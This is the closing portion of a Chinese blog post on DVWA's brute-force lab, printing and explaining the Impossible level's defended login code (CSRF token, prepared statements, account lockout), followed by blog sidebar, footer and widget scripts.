+<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a><strong>Impossible</strong></h2><p>服务器端核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Login'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input </span></span><br><span class="line">    $user = $_POST[ <span class="string">'username'</span> ]; </span><br><span class="line">    $user = stripslashes( $user ); </span><br><span class="line">    $user = mysql_real_escape_string( $user ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input </span></span><br><span class="line">    $pass = $_POST[ <span class="string">'password'</span> ]; </span><br><span class="line">    $pass = stripslashes( $pass ); </span><br><span class="line">    $pass = mysql_real_escape_string( $pass ); </span><br><span class="line">    $pass = md5( $pass ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Default values </span></span><br><span class="line">    $total_failed_login = <span class="number">3</span>; </span><br><span class="line">    $lockout_time       = <span class="number">15</span>; </span><br><span class="line">    $account_locked     = <span class="keyword">false</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (Check user information) </span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;'</span> ); </span><br><span class="line">    $data-&gt;bindParam( <span class="string">':user'</span>, $user, PDO::PARAM_STR ); </span><br><span class="line">    $data-&gt;execute(); </span><br><span class="line">    $row = $data-&gt;fetch(); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if the user has been locked out. </span></span><br><span class="line">    <span class="keyword">if</span>( ( $data-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( $row[ <span class="string">'failed_login'</span> ] &gt;= $total_failed_login ) )  &#123; </span><br><span class="line">        <span class="comment">// User locked out.  Note, using this method would allow for user enumeration! </span></span><br><span class="line">        <span class="comment">//echo "&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;"; </span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Calculate when the user would be allowed to login again </span></span><br><span class="line">        $last_login = $row[ <span class="string">'last_login'</span> ]; </span><br><span class="line">        $last_login = strtotime( $last_login ); </span><br><span class="line">        $timeout    = strtotime( <span class="string">"&#123;$last_login&#125; +&#123;$lockout_time&#125; minutes"</span> ); </span><br><span class="line">        $timenow    = strtotime( <span class="string">"now"</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to see if enough time has passed, if it hasn't locked the account </span></span><br><span class="line">        <span class="keyword">if</span>( $timenow &gt; $timeout ) </span><br><span class="line">            $account_locked = <span class="keyword">true</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (if username matches the password) </span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> ); </span><br><span class="line">    $data-&gt;bindParam( <span class="string">':user'</span>, $user, PDO::PARAM_STR); </span><br><span class="line">    $data-&gt;bindParam( <span class="string">':password'</span>, $pass, PDO::PARAM_STR ); </span><br><span class="line">    $data-&gt;execute(); </span><br><span class="line">    $row = $data-&gt;fetch(); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// If its a valid login... </span></span><br><span class="line">    <span class="keyword">if</span>( ( $data-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( $account_locked == <span class="keyword">false</span> ) ) &#123; </span><br><span class="line">        <span class="comment">// Get users details </span></span><br><span class="line">        $avatar       = $row[ <span class="string">'avatar'</span> ]; </span><br><span class="line">        $failed_login = $row[ <span class="string">'failed_login'</span> ]; </span><br><span class="line">        $last_login   = $row[ <span class="string">'last_login'</span> ]; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area &lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;"</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Had the account been locked out since last login? </span></span><br><span class="line">        <span class="keyword">if</span>( $failed_login &gt;= $total_failed_login ) &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;"</span>; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Number of login attempts: &lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Reset bad login count </span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;'</span> ); </span><br><span class="line">        $data-&gt;bindParam( <span class="string">':user'</span>, $user, PDO::PARAM_STR ); </span><br><span class="line">        $data-&gt;execute(); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Login failed </span></span><br><span class="line">        sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Give the user some feedback </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in &#123;$lockout_time&#125; minutes&lt;/em&gt;.&lt;/pre&gt;"</span>; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update bad login count </span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;'</span> ); </span><br><span class="line">        $data-&gt;bindParam( <span class="string">':user'</span>, $user, PDO::PARAM_STR ); </span><br><span class="line">        $data-&gt;execute(); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set the last login time </span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;'</span> ); </span><br><span class="line">    $data-&gt;bindParam( <span class="string">':user'</span>, $user, PDO::PARAM_STR ); </span><br><span class="line">    $data-&gt;execute(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到Impossible级别的代码加入了可靠的防爆破机制，当检测到频繁的错误登录后，系统会将账户锁定，爆破也就无法继续。</p>
+<p><img src="http://image.3001.net/images/20161009/1476000620885.png!small" alt="爆破提示"></p>
+<p>同时采用了更为安全的PDO（PHP Data Object）机制防御sql注入，这是因为不能使用PDO扩展本身执行任何数据库操作，而sql注入的关键就是通过破坏sql语句结构执行恶意的sql命令。</p>
+<p><strong>关于PDO</strong></p>
+<p><a href="http://www.cnblogs.com/pinocchioatbeijing/archive/2012/03/20/2407869.html" target="_blank" rel="noopener">http://www.cnblogs.com/pinocchioatbeijing/archive/2012/03/20/2407869.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="wlfsky 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="wlfsky 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    wlfsky
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://wlfsky.com/2018/01/19/DVWA之Brute-Force/" title="DVWA之Brute Force">http://wlfsky.com/2018/01/19/DVWA之Brute-Force/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/DVWA教程/" rel="tag"><i class="fa fa-tag"></i> DVWA教程</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/01/19/DVWA之XSS/" rel="next" title="DVWA之XSS">
+                <i class="fa fa-chevron-left"></i> DVWA之XSS
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/01/19/DVWA之Command-Injection/" rel="prev" title="DVWA之Command Injection">
+                DVWA之Command Injection <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+<span class="jiathis_txt">分享到：</span>
+<a class="jiathis_button_fav">收藏夹</a>
+<a class="jiathis_button_copy">复制网址</a>
+<a class="jiathis_button_email">邮件</a>
+<a class="jiathis_button_weixin">微信</a>
+<a class="jiathis_button_qzone">QQ空间</a>
+<a class="jiathis_button_tqq">腾讯微博</a>
+<a class="jiathis_button_douban">豆瓣</a>
+<a class="jiathis_button_share">一键分享</a>
+
+<a href="http://www.jiathis.com/share?uid=2140465" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank">更多</a>
+<a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+var jiathis_config={
+  data_track_clickback:true,
+  summary:"",
+  shortUrl:false,
+  hideMore:false
+}
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/cathand.jpg"
+                alt="wlfsky" />
+            
+              <p class="site-author-name" itemprop="name">wlfsky</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+			  <a title="收藏到书签，偶尔High一下^_^" rel="alternate" class="mw-harlem_shake_slow wobble shake" href='javascript:(function() {
+    function c() {
+        var e = document.createElement("link");
+        e.setAttribute("type", "text/css");
+        e.setAttribute("rel", "stylesheet");
+        e.setAttribute("href", f);
+        e.setAttribute("class", l);
+        document.body.appendChild(e)
+    }
+ 
+    function h() {
+        var e = document.getElementsByClassName(l);
+        for (var t = 0; t < e.length; t++) {
+            document.body.removeChild(e[t])
+        }
+    }
+ 
+    function p() {
+        var e = document.createElement("div");
+        e.setAttribute("class", a);
+        document.body.appendChild(e);
+        setTimeout(function() {
+            document.body.removeChild(e)
+        }, 100)
+    }
+ 
+    function d(e) {
+        return {
+            height : e.offsetHeight,
+            width : e.offsetWidth
+        }
+    }
+ 
+    function v(i) {
+        var s = d(i);
+        return s.height > e && s.height < n && s.width > t && s.width < r
+    }
+ 
+    function m(e) {
+        var t = e;
+        var n = 0;
+        while (!!t) {
+            n += t.offsetTop;
+            t = t.offsetParent
+        }
+        return n
+    }
+ 
+    function g() {
+        var e = document.documentElement;
+        if (!!window.innerWidth) {
+            return window.innerHeight
+        } else if (e && !isNaN(e.clientHeight)) {
+            return e.clientHeight
+        }
+        return 0
+    }
+ 
+    function y() {
+        if (window.pageYOffset) {
+            return window.pageYOffset
+        }
+        return Math.max(document.documentElement.scrollTop, document.body.scrollTop)
+    }
+ 
+    function E(e) {
+        var t = m(e);
+        return t >= w && t <= b + w
+    }
+ 
+    function S() {
+        var e = document.createElement("audio");
+        e.setAttribute("class", l);
+        e.src = i;
+        e.loop = false;
+        e.addEventListener("canplay", function() {
+            setTimeout(function() {
+                x(k)
+            }, 500);
+            setTimeout(function() {
+                N();
+                p();
+                for (var e = 0; e < O.length; e++) {
+                    T(O[e])
+                }
+            }, 15500)
+        }, true);
+        e.addEventListener("ended", function() {
+            N();
+            h()
+        }, true);
+        e.innerHTML = " <p>If you are reading this, it is because your browser does not support the audio element. We recommend that you get a new browser.</p> <p>";
+        document.body.appendChild(e);
+        e.play()
+    }
+ 
+    function x(e) {
+        e.className += " " + s + " " + o
+    }
+ 
+    function T(e) {
+        e.className += " " + s + " " + u[Math.floor(Math.random() * u.length)]
+    }
+ 
+    function N() {
+        var e = document.getElementsByClassName(s);
+        var t = new RegExp("\\b" + s + "\\b");
+        for (var n = 0; n < e.length; ) {
+            e[n].className = e[n].className.replace(t, "")
+        }
+    }
+ 
+    var e = 30;
+    var t = 30;
+    var n = 350;
+    var r = 350;
+    var i = "//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake.mp3";
+    var s = "mw-harlem_shake_me";
+    var o = "im_first";
+    var u = ["im_drunk", "im_baked", "im_trippin", "im_blown"];
+    var a = "mw-strobe_light";
+    var f = "//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake-style.css";
+    var l = "mw_added_css";
+    var b = g();
+    var w = y();
+    var C = document.getElementsByTagName("*");
+    var k = null;
+    for (var L = 0; L < C.length; L++) {
+        var A = C[L];
+        if (v(A)) {
+            if (E(A)) {
+                k = A;
+                break
+            }
+        }
+    }
+    if (A === null) {
+        console.warn("Could not find a node of the right size. Please try a different page.");
+        return
+    }
+    c();
+    S();
+    var O = [];
+    for (var L = 0; L < C.length; L++) {
+        var A = C[L];
+        if (v(A)) {
+            O.push(A)
+        }
+    }
+})()'><i class="fa fa-music"></i> High</a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/wlfreesky" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:wlfsky@hotmail.com" target="_blank" title="E-Mail">
+                    
+                      <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://weibo.com/5484401731" target="_blank" title="微博">
+                    
+                      <i class="fa fa-fw fa-weibo"></i>微博</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="http://music.163.com/#/user/home?id=387055149" target="_blank" title="网易云音乐">
+                    
+                      <i class="fa fa-fw fa-music"></i>网易云音乐</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-globe"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.freebuf.com/" title="FreeBuf" target="_blank">FreeBuf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://bbs.ichunqiu.com/portal.php" title="i春秋" target="_blank">i春秋</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://bbs.pediy.com/" title="看雪" target="_blank">看雪</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://loudong.360.cn/" title="补天" target="_blank">补天</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.owasp.org.cn/owasp-project/2017-owasp-top-10" title="OWASP top10" target="_blank">OWASP top10</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://prompt.ml/0" title="prompt(1)" target="_blank">prompt(1)</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.wechall.net/challs" title="WeChall" target="_blank">WeChall</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://redtiger.labs.overthewire.org/" title="RedTiger" target="_blank">RedTiger</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.somd5.com/" title="SOMD5" target="_blank">SOMD5</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://tool.lu/" title="在线工具" target="_blank">在线工具</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.xctf.org.cn/" title="XCTF社区" target="_blank">XCTF社区</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://xsspt.com/index.php?do=login" title="XSS平台" target="_blank">XSS平台</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#DVWA简介"><span class="nav-number">1.</span> <span class="nav-text">DVWA简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Brute-Force"><span class="nav-number">2.</span> <span class="nav-text">Brute Force</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Low"><span class="nav-number">3.</span> <span class="nav-text">Low</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">3.1.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Medium"><span class="nav-number">4.</span> <span class="nav-text">Medium</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用-1"><span class="nav-number">4.1.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#High"><span class="nav-number">5.</span> <span class="nav-text">High</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用-2"><span class="nav-number">5.1.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Impossible"><span class="nav-number">6.</span> <span class="nav-text">Impossible</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">wlfsky</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">28.8k</span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user">本站访客数</i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人次
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye">本站总访问量</i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+
+
+<div id="hexo-helper-live2d">
+  <canvas id="live2dcanvas" width="150" height="300"></canvas>
+</div>
+<style>
+  #live2dcanvas{
+    position: fixed;
+    width: 150px;
+    height: 300px;
+    opacity:0.7;
+    right: 0px;
+    z-index: 999;
+    pointer-events: none;
+    bottom: -20px;
+  }
+</style>
+<script type="text/javascript" src="/live2d/device.min.js"></script>
+<script type="text/javascript">
+const loadScript = function loadScript(c,b){var a=document.createElement("script");a.type="text/javascript";"undefined"!=typeof b&&(a.readyState?a.onreadystatechange=function(){if("loaded"==a.readyState||"complete"==a.readyState)a.onreadystatechange=null,b()}:a.onload=function(){b()});a.src=c;document.body.appendChild(a)};
+(function(){
+  if((typeof(device) != 'undefined') && (device.mobile())){
+    document.getElementById("live2dcanvas").style.width = '75px';
+    document.getElementById("live2dcanvas").style.height = '150px';
+  }else
+    if (typeof(device) === 'undefined') console.error('Cannot find current-device script.');
+  loadScript("/live2d/script.js", function(){loadlive2d("live2dcanvas", "/live2d/assets/wanko.model.json", 0.5);});
+})();
+</script>
+
+
+</body>
+</html>
